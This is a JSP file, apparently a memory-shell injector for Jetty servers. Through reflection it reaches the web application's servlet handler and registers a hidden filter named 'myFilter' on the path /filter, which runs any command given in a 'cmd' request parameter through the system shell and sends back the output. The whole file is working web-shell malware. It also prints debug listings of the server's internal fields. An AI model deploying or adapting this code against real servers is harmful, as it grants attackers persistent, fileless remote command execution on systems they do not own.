<%@ page import="java.lang.reflect.Field"%>
<%@ page import="java.lang.reflect.Method"%>
<%@ page import="java.util.Scanner"%>
<%@ page import="java.util.EnumSet"%>
<%@ page import="java.io.*"%>

<%
    String filterName = "myFilter";
    String urlPattern = "/filter";
    Filter filter = new Filter() {
        @Override
        public void init(FilterConfig filterConfig) throws ServletException {
        }
        @Override
        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
            HttpServletRequest req = (HttpServletRequest) servletRequest;
            if (req.getParameter("cmd") != null) {
                boolean isLinux = true;
                String osTyp = System.getProperty("os.name");
                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                    isLinux = false;
                }
                String[] cmds = isLinux ? new String[] {"sh", "-c", req.getParameter("cmd")} : new String[] {"cmd.exe", "/c", req.getParameter("cmd")};
                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                Scanner s = new Scanner( in ).useDelimiter("\\a");
                String output = s.hasNext() ? s.next() : "";
                servletResponse.getWriter().write(output);
                servletResponse.getWriter().flush();
                return;
            }
            filterChain.doFilter(servletRequest, servletResponse);
        }
        @Override
        public void destroy() {
        }
    };

    Method threadMethod = Class.forName("java.lang.Thread").getDeclaredMethod("getThreads");
    threadMethod.setAccessible(true);
    Thread[] threads = (Thread[]) threadMethod.invoke(null);
    ClassLoader threadClassLoader = null;

    for (Thread thread:threads)
    {
        threadClassLoader = thread.getContextClassLoader();
        if(threadClassLoader != null){
            if(threadClassLoader.toString().contains("WebAppClassLoader")){
                Field fieldContext = threadClassLoader.getClass().getDeclaredField("_context");
                fieldContext.setAccessible(true);
                Object webAppContext = fieldContext.get(threadClassLoader);
                
                // 打印调试信息
                out.println("webAppContext class: " + webAppContext.getClass().getName() + "<br>");
                out.println("webAppContext superclass: " + webAppContext.getClass().getSuperclass().getName() + "<br>");
                
                // 递归打印所有父类的字段
                Class<?> clazz = webAppContext.getClass();
                while (clazz != null) {
                    Field[] fields = clazz.getDeclaredFields();
                    for (Field field : fields) {
                        out.println("Field: " + field.getName() + " in class: " + clazz.getName() + "<br>");
                    }
                    clazz = clazz.getSuperclass();
                }
                
                // 尝试获取 _servletHandler 字段
                try {
                    Field fieldServletHandler = webAppContext.getClass().getSuperclass().getDeclaredField("_servletHandler");
                    fieldServletHandler.setAccessible(true);
                    Object servletHandler = fieldServletHandler.get(webAppContext);
                    Field fieldFilters = servletHandler.getClass().getDeclaredField("_filters");
                    fieldFilters.setAccessible(true);
                    Object[] filters = (Object[]) fieldFilters.get(servletHandler);
                    boolean flag = false;
                    for(Object f:filters){
                        Field fieldName = f.getClass().getSuperclass().getDeclaredField("_name");
                        fieldName.setAccessible(true);
                        String name = (String) fieldName.get(f);
                        if(name.equals(filterName)){
                            flag = true;
                            break;
                        }
                    }
                    if(flag){
                        out.println("[-] Filter " + filterName + " exists.<br>");
                        return;
                    }
                    out.println("[+] Add Filter: " + filterName + "<br>");
                    out.println("[+] urlPattern: " + urlPattern + "<br>");
                    ClassLoader classLoader = servletHandler.getClass().getClassLoader();
                    Class sourceClazz = null;
                    Object holder = null;
                    Field field = null;
                    try{
                        sourceClazz = classLoader.loadClass("org.eclipse.jetty.servlet.Source");
                        field = sourceClazz.getDeclaredField("JAVAX_API");
                        Method method = servletHandler.getClass().getMethod("newFilterHolder", sourceClazz);
                        holder = method.invoke(servletHandler, field.get(null));
                    }catch(ClassNotFoundException e){
                        sourceClazz = classLoader.loadClass("org.eclipse.jetty.servlet.BaseHolder$Source");
                        Method method = servletHandler.getClass().getMethod("newFilterHolder", sourceClazz);
                        holder = method.invoke(servletHandler, Enum.valueOf(sourceClazz, "JAVAX_API"));
                    }
                    holder.getClass().getMethod("setName", String.class).invoke(holder, filterName);               
                    holder.getClass().getMethod("setFilter", Filter.class).invoke(holder, filter);
                    servletHandler.getClass().getMethod("addFilter", holder.getClass()).invoke(servletHandler, holder);

                    Class  clazzFilterMapping         = classLoader.loadClass("org.eclipse.jetty.servlet.FilterMapping");
                    Object filterMapping = clazzFilterMapping.newInstance();
                    Method method        = filterMapping.getClass().getDeclaredMethod("setFilterHolder", holder.getClass());
                    method.setAccessible(true);
                    method.invoke(filterMapping, holder);
                    filterMapping.getClass().getMethod("setPathSpecs", String[].class).invoke(filterMapping, new Object[]{new String[]{urlPattern}});
                    filterMapping.getClass().getMethod("setDispatcherTypes", EnumSet.class).invoke(filterMapping, EnumSet.of(DispatcherType.REQUEST));
                    servletHandler.getClass().getMethod("prependFilterMapping", filterMapping.getClass()).invoke(servletHandler, filterMapping);
                } catch (NoSuchFieldException e) {
                    out.println("Error: " + e.getMessage() + "<br>");
                }
            }     
        }
    }
%>